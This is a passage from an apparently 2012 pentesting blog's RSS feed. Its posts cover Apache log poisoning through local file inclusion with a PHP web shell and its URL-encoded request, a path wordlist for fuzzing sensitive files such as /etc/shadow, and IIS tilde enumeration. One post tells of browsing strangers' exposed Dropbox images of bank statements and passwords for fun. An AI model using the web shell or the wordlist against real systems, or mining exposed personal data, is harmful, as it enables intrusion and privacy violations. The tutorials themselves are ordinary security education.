            <content type="html"><![CDATA[<p>So we have our Local File Inclusion vulnerability and we can read the <code>/etc/passwd</code> file, now it&rsquo;s time to start escalating the attack so that we are able to execute our own commands on the target system.</p>

    <img src="https://i.imgur.com/LUYTF.png"  class="left"  />


<p>In the previous post, we found the Apache log files and particularly the Apache <code>error.log</code> file using Burp Suite&rsquo;s Intruder module. We are now going to use this log file to inject our own PHP code into this page.</p>
<p>If we tried to access <code>http://www.example.com/askjdhaksghfkgf</code> we should get an Error 404 telling us the the page was not found. Additionally, this should also echo our invalid request into the <code>error.log</code> file and we can now clearly see that by requesting anything that generates and error we have the ability to influence the contents of the <code>error.log</code> file.</p>

    <img src="https://i.imgur.com/LNkS8.png"  class="left"  />


<p>Seeing as we&rsquo;re using this as part of an LFI vulnerability, we are also dynamically writing code into the page we are viewing. If the site is running PHP, then we can therefore create our own PHP functions just by requesting a page that does not exist.</p>
<p>Take the following PHP example:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
  <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); 
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>This simple piece of code will take whatever was passed in the <code>cmd</code> parameter and run it on the command line of the host operating system.</p>
<p>If we wrote the same piece of code inline it would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>And if we went one step further and URL encoded it, it should look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
</code></pre></div><p>Now we append this to the URL and make the following request:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://www.example.com/askjdhaksghfkgf%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
</code></pre></div><p>This gives us another 404 error message although this time it has also re-written our PHP code into the Apache <code>error.log</code> file as part of our invalid request. When Apache reads this code back, it see&rsquo;s the PHP code and processes it as a legitimate PHP script when we access this vulnerable page.</p>

    <img src="https://i.imgur.com/aOoex.png"  class="left"  />


<p>At first, nothing may seem out of sort except for the two invalid requests although you can see that it is now looking for a <code>cmd</code> parameter which we have not provided as yet. Is we now append the cmd parameter as <code>%00&amp;cmd=ls</code> to the end of the URL, we see the output of our <code>ls</code> command where we injected our own PHP code.</p>

    <img src="https://i.imgur.com/4ti2Z.png"  class="left"  />


<p>This can be extremely powerful when testing Web Applications as we can use use this method to escalate our attack to run some pretty powerful requests including downloading files onto the host system, reading the source code of file on the site, enumerating configuration files for passwords such as the MySQL connect function and starting netcat listeners to gain full shell access.</p>
<p>This is a good example of how to demonstrate that the risks associated with LFI go far beyond just reading the output of the <code>/etc/passwd</code> file and can make or break a penetration test when you don&rsquo;t have other methods available to you.</p>

    <img src="https://i.imgur.com/B2GPw.jpg"  class="left"  />


<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>finding the apache log files using burp intruder</title>
            <link>https://www.pwnd.red/posts/finding-the-apache-log-files-using-burp-intruder/</link>
            <pubDate>Sun, 04 Nov 2012 01:26:05 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/finding-the-apache-log-files-using-burp-intruder/</guid>
            <description>Often when conducting security assessments it is necessary to go beyond just identifying the vulnerability, reporting it and heading out for a beer. Sometimes, like when conducting a penetration test or when asked by a client to demonstrate business risk, it is necessary to gain command line line access to the machine to show the risks associated with having a web user being able to execute commands on their machine. Often this involves getting a shell by some means but in the case of Local File Inclusion (LFI) simply finding the Apache Log location folder can be enough to start running commands on the system as the Apache service account.</description>
            <content type="html"><![CDATA[<p>Often when conducting security assessments it is necessary to go beyond just identifying the vulnerability, reporting it and heading out for a beer. Sometimes, like when conducting a penetration test or when asked by a client to demonstrate business risk, it is necessary to gain command line line access to the machine to show the risks associated with having a web user being able to execute commands on their machine. Often this involves getting a shell by some means but in the case of Local File Inclusion (LFI) simply finding the Apache Log location folder can be enough to start running commands on the system as the Apache service account.</p>
<p>Often I&rsquo;ve wasted hours trying all sorts of combinations trying to find the correct location of the log files by looking up version numbers and identifying operating systems but being the true to the Pentesters code, sometimes it&rsquo;s better to be lazy and just automate the damn thing. So what a buddy of mine and me did was to compile a list of common Apache log file locations and files that may indicate Apache log locations across different operating systems. This list is by no means comprehensive and if the developer or engineer has bothered to spend 5 minutes moving the log file locations then chances are that this list may not help you.</p>
<p>Luckily, most people don&rsquo;t bother moving logs which makes this a great list to work with. Below is an example of how to use this list to quickly discover the location of the Apache log location after you&rsquo;ve located a LFI vulnerability.</p>
<p>This tutorial will utilize Burp Suite, one of the better Web Testing suites available. If you don&rsquo;t have a copy yet, go get it from <a href="http://www.portswigger.net/burp/">http://www.portswigger.net/burp/</a>. The paid version of the software does not have the timing restrictions and is well worth getting to speed up this attack.</p>
<p>To start, copy the contents of this list and save it somewhere you can access through Burp Suite.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/Library/WebServer/Documents/index.php
/Library/WebServer/Documents/index.html
/apache/logs/access.log
/apache/logs/error.log
/etc/GeoIP.conf.default
/etc/PolicyKit/PolicyKit.conf
/etc/X11/xorg.conf
/etc/X11/xorg.conf-vesa
/etc/X11/xorg.conf-vmware
/etc/X11/xorg.conf.BeforeVMwareToolsInstall
/etc/X11/xorg.conf.orig
/etc/adduser.conf
/etc/airoscript.conf
/etc/apache2/apache2.conf
/etc/apache2/conf.d
/etc/apache2/conf.d/charset
/etc/apache2/conf.d/security
/etc/apache2/envvars
/etc/apache2/httpd.conf
/etc/apache2/mods-available/autoindex.conf
/etc/apache2/mods-available/deflate.conf
/etc/apache2/mods-available/dir.conf
/etc/apache2/mods-available/mem_cache.conf
/etc/apache2/mods-available/mime.conf
/etc/apache2/mods-available/proxy.conf
/etc/apache2/mods-available/setenvif.conf
/etc/apache2/mods-available/ssl.conf
/etc/apache2/mods-enabled/alias.conf
/etc/apache2/mods-enabled/deflate.conf
/etc/apache2/mods-enabled/dir.conf
/etc/apache2/mods-enabled/mime.conf
/etc/apache2/mods-enabled/negotiation.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-enabled/status.conf
/etc/apache2/ports.conf
/etc/apache2/sites-available/default
/etc/apache2/sites-enabled/000-default
/etc/apt/apt.conf.d
/etc/apt/apt.conf.d/00trustcdrom
/etc/apt/apt.conf.d/01autoremove
/etc/apt/apt.conf.d/01ubuntu
/etc/apt/apt.conf.d/05aptitude
/etc/apt/apt.conf.d/50unattended-upgrades
/etc/apt/apt.conf.d/70debconf
/etc/arpalert/arpalert.conf
/etc/avahi/avahi-daemon.conf
/etc/bash_completion.d/debconf
/etc/belocs/locale-gen.conf
/etc/bluetooth/input.conf
/etc/bluetooth/main.conf
/etc/bluetooth/network.conf
/etc/bluetooth/rfcomm.conf
/etc/bonobo-activation/bonobo-activation-config.xml
/etc/ca-certificates.conf
/etc/ca-certificates.conf.dpkg-old
/etc/casper.conf
/etc/chkrootkit.conf
/etc/clamav/clamd.conf
/etc/clamav/freshclam.conf
/etc/conky/conky.conf
/etc/console-tools/config.d
/etc/console-tools/config.d/splashy
/etc/cups/acroread.conf
/etc/cups/cupsd.conf
/etc/cups/cupsd.conf.default
/etc/cups/pdftops.conf
/etc/cups/printers.conf
/etc/cvs-cron.conf
/etc/cvs-pserver.conf
/etc/dbus-1/session.conf
/etc/dbus-1/system.conf
/etc/debconf.conf
/etc/defoma/config
/etc/defoma/config/x-ttcidfont-conf.conf2
/etc/deluser.conf
/etc/depmod.d/ubuntu.conf
/etc/dhcp3/dhclient.conf
/etc/dhcp3/dhcpd.conf
/etc/discover-modprobe.conf
/etc/discover.conf.d
/etc/discover.conf.d/00discover
/etc/dns2tcpd.conf
/etc/e2fsck.conf
/etc/esound/esd.conf
/etc/etter.conf
/etc/fonts/conf.d
/etc/fonts/conf.d/README
/etc/foomatic/filter.conf
/etc/foremost.conf
/etc/freetds/freetds.conf
/etc/fuse.conf
/etc/gconf
/etc/gconf/2
/etc/gconf/2/evoldap.conf
/etc/gconf/2/path
/etc/gconf/gconf.xml.defaults
/etc/gconf/gconf.xml.defaults/%gconf-tree.xml
/etc/gconf/gconf.xml.mandatory
/etc/gconf/gconf.xml.mandatory/%gconf-tree.xml
/etc/gconf/gconf.xml.system
/etc/gdm/failsafeDexconf
/etc/gnome-vfs-2.0/modules/default-modules.conf
/etc/gnome-vfs-2.0/modules/extra-modules.conf
/etc/gre.d/1.9.0.10.system.conf
/etc/gre.d/1.9.0.14.system.conf
/etc/gre.d/1.9.0.15.system.conf
/etc/group
/etc/gtk-2.0/im-multipress.conf
/etc/hdparm.conf
/etc/host.conf
/etc/htdig/htdig.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/acces.log
/etc/httpd/logs/acces_log
/etc/httpd/logs/access.log
/etc/httpd/logs/access_log
/etc/httpd/logs/error.log
/etc/httpd/logs/error_log
/etc/httpd/mod_php.conf
/etc/inetd.conf
/etc/initramfs-tools/conf.d
/etc/irssi.conf
/etc/java-6-sun/fontconfig.properties
/etc/kbd/config
/etc/kernel-img.conf
/etc/kernel-pkg.conf
/etc/ld.so.conf
/etc/ldap/ldap.conf
/etc/logrotate.conf
/etc/ltrace.conf
/etc/mail/sendmail.conf
/etc/manpath.config
/etc/menu-methods/menu.config
/etc/miredo-server.conf
/etc/miredo.conf
/etc/miredo/miredo-server.conf
/etc/miredo/miredo.conf
/etc/modprobe.d/vmware-tools.conf
/etc/mono/1.0/machine.config
/etc/mono/2.0/machine.config
/etc/mono/2.0/web.config
/etc/mono/config
/etc/mtools.conf
/etc/mysql/conf.d
/etc/mysql/conf.d/old_passwords.cnf
/etc/nsswitch.conf
/etc/oinkmaster.conf
/etc/openvpn/update-resolv-conf
/etc/pam.conf
/etc/passwd
/etc/pear/pear.conf
/etc/php.ini
/etc/php/php.ini
/etc/php5/apache2/conf.d
/etc/php5/apache2/php.ini
/etc/php5/php.ini
/etc/pm/config.d
/etc/pm/config.d/00sleep_module
/etc/postgresql-common/autovacuum.conf
/etc/prelude/default/global.conf
/etc/prelude/default/idmef-client.conf
/etc/prelude/default/tls.conf
/etc/privoxy/config
/etc/proxychains.conf
/etc/pulse/client.conf
/etc/python/debian_config
/etc/reader.conf
/etc/reader.conf.d
/etc/reader.conf.d/0comments
/etc/reader.conf.d/libccidtwin
/etc/reader.conf.old
/etc/remastersys.conf
/etc/resolv.conf
/etc/resolvconf
/etc/resolvconf/update-libc.d
/etc/resolvconf/update-libc.d/sendmail
/etc/rinetd.conf
/etc/samba/dhcp.conf
/etc/samba/smb.conf
/etc/scrollkeeper.conf
/etc/security/access.conf
/etc/security/group.conf
/etc/security/limits.conf
/etc/security/namespace.conf
/etc/security/opasswd
/etc/security/pam_env.conf
/etc/security/sepermit.conf
/etc/security/time.conf
/etc/sensors.conf
/etc/shadow
/etc/skel/.config
/etc/skel/.config/Trolltech.conf
/etc/skel/.config/codef00.com
/etc/skel/.config/menus
/etc/skel/.config/menus/applications-kmenuedit.menu
/etc/skel/.config/user-dirs.dirs
/etc/skel/.config/user-dirs.locale
/etc/skel/.kde3/share/apps/kconf_update
/etc/skel/.kde3/share/apps/kconf_update/log/update.log
/etc/skel/.kde3/share/share/apps/kconf_update
/etc/skel/.kde3/share/share/apps/kconf_update/log
/etc/skel/.kde3/share/share/apps/kconf_update/log/update.log
/etc/smi.conf
/etc/snmp/snmpd.conf
/etc/snort/reference.config
/etc/snort/rules/emerging.conf
/etc/snort/rules/open-test.conf
/etc/snort/snort-mysql.conf
/etc/snort/snort.conf
/etc/snort/threshold.conf
/etc/splashy/config.xml
/etc/ssh/sshd_config
/etc/stunnel/stunnel.conf
/etc/subversion/config
/etc/sysctl.conf
/etc/sysctl.d/10-console-messages.conf
/etc/sysctl.d/10-network-security.conf
/etc/sysctl.d/10-process-security.conf
/etc/sysctl.d/wine.sysctl.conf
/etc/syslog.conf
/etc/tinyproxy/tinyproxy.conf
/etc/tor/tor-tsocks.conf
/etc/tpvmlp.conf
/etc/tsocks.conf
/etc/ucf.conf
/etc/udev/udev.conf
/etc/ufw/sysctl.conf
/etc/ufw/ufw.conf
/etc/uniconf.conf
/etc/unicornscan/modules.conf
/etc/unicornscan/payloads.conf
/etc/unicornscan/unicorn.conf
/etc/updatedb.conf
/etc/updatedb.conf.BeforeVMwareToolsInstall
/etc/vmware-tools/config
/etc/vmware-tools/tpvmlp.conf
/etc/vmware-tools/vmware-tools-libraries.conf
/etc/w3m/config
/etc/wicd/dhclient.conf.template.default
/etc/wicd/manager-settings.conf
/etc/wicd/wired-settings.conf
/etc/wicd/wireless-settings.conf
/etc/xdg/user-dirs.conf
/logs/access.log
/logs/error.log
/private/etc/apache2/extra/httpd-default.conf
/private/etc/apache2/extra/httpd-userdir.conf
/private/etc/apache2/extra/httpd-vhosts.conf
/private/etc/apache2/mime.types
/private/var/log/apache2/access_log
/private/var/log/apache2/error_log
/proc/cpuinfo
/proc/meminfo
/proc/self/cmdline
/proc/self/environ
/proc/self/mounts
/proc/self/stat
/proc/self/status
/proc/version
/share/snmp/snmpd.conf
/srv/www/htdocs/index.html
/usr/bin/php/php.ini
/usr/bin/php5/bin/php.ini
/usr/local/apache/logs/access.log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/error.log
/usr/local/apache/logs/error_log
/usr/local/apache2/conf/extra/httpd-ssl.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache2/logs/access_log
/usr/local/apache2/logs/error_log
/usr/local/etc/apache2/httpd.conf
/usr/local/etc/apache22/httpd.conf
/usr/local/www/apache22/data/index.html
/usr/pkg/etc/httpd/httpd.conf
/var/log/access.log
/var/log/access_log
/var/log/apache/access.log
/var/log/apache/access_log
/var/log/apache/error.log
/var/log/apache/error_log
/var/log/apache2/access.log
/var/log/apache2/access_log
/var/log/apache2/error.log
/var/log/apache2/error_log
/var/log/error.log
/var/log/error_log
/var/log/httpd-access.log
/var/log/httpd-error.log
/var/log/httpd/access.log
/var/log/httpd/access_log
/var/log/httpd/error.log
/var/log/httpd/error_log
/var/www/conf/httpd.conf
/var/www/logs/access.log
/var/www/logs/access_log
/var/www/logs/error.log
/var/www/logs/error_log
/wwwroot/php/php.ini
</code></pre></div><p>Once you have saved this list somewhere, open up Burp Suite, locate the LFI injection point and send the request to Burp Intruder.</p>

    <img src="https://i.imgur.com/A3L4q.png"  class="left"  />


<p>In the Burp Intruder window, select the <code>Positions</code> tab and mark the position of your LFI injection point. Change the attack type to <code>Sniper</code>. Then under the <code>Payloads</code> tab, choose the Apache logs list or paste the contents of the list into the payload window.</p>

    <img src="https://i.imgur.com/VNbX4.png"  class="left"  />


<p>Start the attack and pay attention to the length column. Typically Apache log folders are going to be large and should return a large length field.</p>

    <img src="https://i.imgur.com/1RUry.png"  class="left"  />


<p>When you find a length field that is significantly larger than the other requests, look at the response to see if the contents returned match what an Apache log file would look like. If it does look like a log file and you can see some of your previous traffic displayed, you have successfully found the Apache log location and can now use this to start injecting your PHP code to run requests on the target machine.</p>
<p>I will outline the steps to complete this in the next post.</p>
<blockquote>
<p>this log list is not comprehensive and I will continue to add to it as I find more more locations as well as some windows folder locations.</p>
</blockquote>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>is robots.txt dead? lets ask dropbox</title>
            <link>https://www.pwnd.red/posts/is-robots-txt-dead-lets-ask-dropbox/</link>
            <pubDate>Mon, 17 Sep 2012 09:48:35 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/is-robots-txt-dead-lets-ask-dropbox/</guid>
            <description>First off I&amp;rsquo;d like to give creds to Francis Brown and Rob Ragan who presented their talk Tenacious Diggity at DEFCON 20 where I found out about the apparent steam-rolling of Dropbox&amp;rsquo;s robots.txt file. For as far back as I can remember, the robots.txt file has been a ban-list of places that search engine crawlers are supposed to ignore when crawling a site. Recently however there is some talk that the preferred way of disallowing crawlers is to control them using alternative methods such as metatags and javascript.</description>
            <content type="html"><![CDATA[<p>First off I&rsquo;d like to give creds to Francis Brown and Rob Ragan who presented their talk <a href="https://www.defcon.org/html/defcon-20/dc-20-speakers.html#Brown">Tenacious Diggity</a> at <a href="https://www.defcon.org/">DEFCON 20</a> where I found out about the apparent steam-rolling of Dropbox&rsquo;s robots.txt file. For as far back as I can remember, the robots.txt file has been a ban-list of places that search engine crawlers are supposed to ignore when crawling a site. Recently however there is some talk that the preferred way of disallowing crawlers is to control them using alternative methods such as metatags and javascript.</p>
<p>It may appear however, that Google has already decided that robots.txt is merely a bug heading towards it&rsquo;s windscreen and is indexing pages that are excluded via the robots.txt as is apparent with Dropbox.</p>

    <img src="https://i.imgur.com/T3Gnp.png"  class="left"  />


<p>Above is a copy of Dropbox&rsquo;s <code>robots.txt</code> file and you can clearly see that <code>/gallery/</code> is on the no-fly list however the following screenshot suggests otherwise.</p>

    <img src="https://i.imgur.com/yUrYp.png"  class="left"  />


<p>Why should you care about this? What&rsquo;s so special about &ldquo;Gallery&rdquo; anyway? Well if you are a Dropbox user and you have ever clicked &ldquo;Start Import&rdquo; when seeing the below message, you should know that those photo&rsquo;s of yours may just be on that Google search result and as a result, public.</p>

    <img src="https://i.imgur.com/aEzN3.png"  class="left"  />


<p>I&rsquo;m almost positive that Dropbox did not want the galleries to be indexed and I&rsquo;m also sure that Googles Army of Lawyers has a good reason why it was but as a curious individual who enjoys tinkering with things I couldn&rsquo;t resist having a snoop through some of the results.</p>
<p>By appending some choice keywords to the searches such as confidential, screen, budget, excel, portfolio, audition, temp, delete and a few others, I was absolutely staggered at the amount of useful data people have images of. Just in the first 10 or so pages of each result I was able to find bank statements, drivers licenses, credit cards, passwords, wifi keys, serial numbers, medical information and yes&hellip; lots and lots of porn (<em>home made mostly</em>)</p>

    <img src="https://i.imgur.com/3fi1S.png"  class="left"  />


<p>Whether you&rsquo;re bored like me or digging  up some info for (<code>$insert legitimate reason here</code>) it is a fantastic search to kill time with. If you are planning on being pro-active with it, go and get Stach &amp; Liu&rsquo;s <a href="http://www.stachliu.com/resources/tools/google-hacking-diggity-project/attack-tools/">Search Diggity</a> tool and look at some of the fantastic features they&rsquo;ve built for searching for documents through Skydrive, AWS S3 and Dropbox.</p>

    <img src="https://i.imgur.com/c8SaC.png"  class="left"  />


<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>using ~ to enumerate directories on IIS 6.0</title>
            <link>https://www.pwnd.red/posts/using-tilde-to-enumerate-directories-on-iis-6-0/</link>
            <pubDate>Thu, 16 Aug 2012 01:09:43 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/using-tilde-to-enumerate-directories-on-iis-6-0/</guid>
            <description>Recently I was running a web application assessment for a client whose system was running IIS 6.0 on Windows 2003 server. Much foosball and coffee had already gone into this assessment yet I still didn&amp;rsquo;t have the &amp;ldquo;Oh Shit, how did you find that?&amp;rdquo; discovery that makes developers curl up in a ball and rock themselves to sleep. These developers where smarter than most and this was not their first assessment either.</description>
            <content type="html"><![CDATA[<p>Recently I was running a web application assessment for a client whose system was running IIS 6.0 on Windows 2003 server. Much foosball and coffee had already gone into this assessment yet I still didn&rsquo;t have the &ldquo;Oh Shit, how did you find that?&rdquo; discovery that makes developers curl up in a ball and rock themselves to sleep. These developers where smarter than most and this was not their first assessment either. They had learned from previous tests to be vigilant about input sanitation and the usual bag of tricks.</p>
<p>I was pretty much ready to swap my Nerf Gun for Microsoft Word and start typing up my findings when I saw <a href="http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">this</a> article by Soroush Dalili about using a 17 year old technique to enumerate directories on &lt; IIS 7.0 using the good old &ldquo;~1&rdquo; from the 8dot3 days of Windows.</p>

    <img src="https://i.imgur.com/PCaJ9.png"  class="centre"  />


<p>A bit of history for you kids and nostalgia for us old-timers about the 8dot3 days of Windows was that in older versions of the OS the user had to use filenames that met the format of filename.ext (<em>or 8 chars for the filename and 3 chars for the extension.</em>) That is why the older systems always had files like <code>autoexec.bat</code>, <code>config.sys</code> and <code>command.com</code></p>
<p>As time moved on, past Y2K I believe, the time came when Bob wanted to hide his porn collection in folders called <code>photos\of\aunty\agnus\70th\anniversary\very\boring\dont\open\ever</code>, Microsoft obliged and made the lengths far longer and such as we have today we can all create the dumb names for folders and files to remind us what&rsquo;s in them. The problem arose when copying files from your awesome Pentium 75 MMX running Windows 2000 to your 486 running Windows 98 and windows would then show the folder as <code>photos~1</code> as it&rsquo;s way to stay away from the angry blue screen.</p>
<p>I had pretty much though at this point that the 8dot3 days were long gone and with the long names we have for websites today that IIS wouldn&rsquo;t have bothered supporting any functionality for 8dot3 files and folders. Turns out that Windows Server 2003 running IIS 6.0 does just that! I grabbed a copy of <a href="http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">Soroush&rsquo;s PoC</a> and ran it against the site, pretty much content that whatever it would find would have already been found by DirBuster but decided to give it a go anyway.</p>
<p>To my astonishment it had found three folders, two of which I knew about and one that I didn&rsquo;t. I figured that <code>COLLIE~1</code> wouldn&rsquo;t be that hard to guess since I knew of at least on other company who used this system whose first six letters matched those and upon snooping inside there I found a very old version of the site that the developers had used when building/testing for that client and had never removed it. As such, the code was not up to standard in any way  and the &ldquo;Oh Shit&rdquo; moment had arrived.</p>
<p>There are tens of thousands of sites out there running IIS 6.0 as can be seen <a href="http://www.shodanhq.com/search?q=iis+6.0">here</a> and a lot of them may be susceptible to the same ~1 enumeration vulnerabilities described above. Your crawlers and scanners are very good at finding folders named <code>admin</code>, <code>secure</code>, <code>wp-login</code> and the rest but might never be good enough to find <code>/johnspizzaemporium</code> although your inside info and a <code>JOHNSP~1</code> may be enough to give you the edge you need. I suggest reading the article fully as it can do deep recursion into folders and give you a very good head start on your DirBuster scan. Also, seeing as any <code>.aspx</code> file does not meet the 8dot3 standard, the tool will find all the occurrences of <code>.aspx</code> files</p>
<blockquote>
<p>If I can find some Windows 2003 floppy discs, I&rsquo;ll set it up in the lab and do a video demonstration of the exploit and post it up.</p>
</blockquote>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
<p>References:</p>
<ul>
<li>Soroush Dalili - <a href="http://soroush.secproject.com/">http://soroush.secproject.com/</a></li>
<li>Microsoft Tilde Directory Enumeration - <a href="http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a></li>
<li>IIS Shortname Scanner PoC – <a href="http://code.google.com/p/iis-shortname-scanner-poc/">http://code.google.com/p/iis-shortname-scanner-poc/</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>d0x’n myself beats the &#39;hello world&#39; post</title>
            <link>https://www.pwnd.red/posts/d0xn-myself-beats-the-hello-world-post/</link>
            <pubDate>Mon, 30 Jul 2012 11:46:56 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/d0xn-myself-beats-the-hello-world-post/</guid>
            <description>My name is Ryan and I live in Sydney. My history is extremely boring and full of horror stories from racist countries so I&amp;rsquo;ll skip to 5 years ago in a hotel room in Perth, shortly after I moved to Australia. I liked to call myself an IT Professional but in all honesty I was a Windows Systems Administrator for 13 years who discovered that you can actually make a living breaking into peoples shit&amp;hellip;.</description>
            <content type="html"><![CDATA[<p><img src="https://i.imgur.com/dpcoz.jpg" alt=""> My name is Ryan and I live in Sydney. My history is extremely boring and full of horror stories from racist countries so I&rsquo;ll skip to 5 years ago in a hotel room in Perth, shortly after I moved to Australia. I liked to call myself an IT Professional but in all honesty I was a Windows Systems Administrator for 13 years who discovered that you can actually make a living breaking into peoples shit&hellip;.ethically of course!</p>
<p>I met a guy in a downstairs bar of a hotel I was staying in and after shooting the shit and finding out we both worked in IT he told me why he was there. He was performing a Penetration Test of that hotel and he explained his life of planes, hotels and laptops and  after showing me my first ever exploit, I realised I wanted&hellip;no&hellip;NEEDED to be him! I wanted his life and I wanted his sorcery! I can&rsquo;t remember his name but if you are reading this, get in touch!</p>
<p>Long story short, I spent the next 5 years learning that there was actually more than one operating system in the world and that a few short clicks in a nix terminal were far more powerful than a thousand clicks on a desktop. I started with a list of URL&rsquo;s written down the hotels napkin and low and behold everything I needed to know was right there in plain sight if you know what to look for. Googleing &ldquo;how to be 1337 hax0r&rdquo;; does not return the results you want but searching for the correct building blocks yields some amazing content. I spent a lot of time learning the tools and the tricks and testing them out on friends and family and having some good times learning that a Penetration Tester is more than the sum of his&hellip;distro&hellip;and that to be effective in achieving something you need to &ldquo;think&rdquo;; like an attacker would to see all the vulnerabilities.</p>
<p>Last year I decided that my job was interfering too much with my wanting to spend all day vulnerability hunting and that the continuous need for me to repeatedly show users how to print their emails was not going to bring me the fuzziness I so craved. I spoke to some of the &ldquo;Legends&rdquo;; in the industry and asked for some advise on how I could go about becoming this destroyer of systems. Two answers frequently popped up mentioning certifications&hellip; the CISSP and the OSCP. I decided to do both.</p>
<p>I got in touch with Offensive Security and signed up right away. I managed to get all the Lab machines (including those annoying ones PAIN, SUFFERANCE and FC4) and passed the exam in 23 Red Bull fuelled hours! One week later I bit the bullet and again, while working full time and ignoring my family, I completed another &ldquo;Security Certification.&quot;;</p>
<p>Not long after completing my certs, a man who I will always be in debt to, gave me the opportunity to take on a contract he had. I uprooted my life&hellip;wife, dogs, house and all, moved to Sydney and started the long slog into the InfoSec industry. For the first time in over three decades, I wake up, knowing that I&rsquo;m about to go do something I&rsquo;m passionate about and realise that I&rsquo;m getting ever closer to achieving what I set out to do 5 years ago.</p>
<p>A famous quote by&hellip;.somebody &ldquo;<em>If you&rsquo;re doing something you&rsquo;re passionate about for work, it&rsquo;s no longer a job</em>&rdquo;</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
    </channel>
</rss>
